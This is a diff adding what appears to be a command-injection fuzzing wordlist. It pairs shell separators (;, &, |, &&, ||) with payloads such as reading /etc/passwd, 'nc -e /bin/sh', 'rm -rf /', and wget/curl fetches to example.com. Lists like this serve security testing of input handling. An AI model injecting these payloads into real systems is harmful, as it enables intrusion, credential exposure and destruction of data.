@@ -1,0 +1,45 @@
+;ls
+&ls
+|ls
+&&ls
+||ls
+;uname -a
+&uname -a
+|uname -a
+&&uname -a
+||uname -a
+;id
+&id
+|id
+&&id
+||id
+;whoami
+&whoami
+|whoami
+&&whoami
+||whoami
+;cat /etc/passwd
+&cat /etc/passwd
+|cat /etc/passwd
+&&cat /etc/passwd
+||cat /etc/passwd
+;nc -e /bin/sh
+&nc -e /bin/sh
+|nc -e /bin/sh
+&&nc -e /bin/sh
+||nc -e /bin/sh
+;rm -rf /
+&rm -rf /
+|rm -rf /
+&&rm -rf /
+||rm -rf /
+;wget http://example.com
+&wget http://example.com
+|wget http://example.com
+&&wget http://example.com
+||wget http://example.com
+;curl http://example.com
+&curl http://example.com
+|curl http://example.com
+&&curl http://example.com
+||curl http://example.com
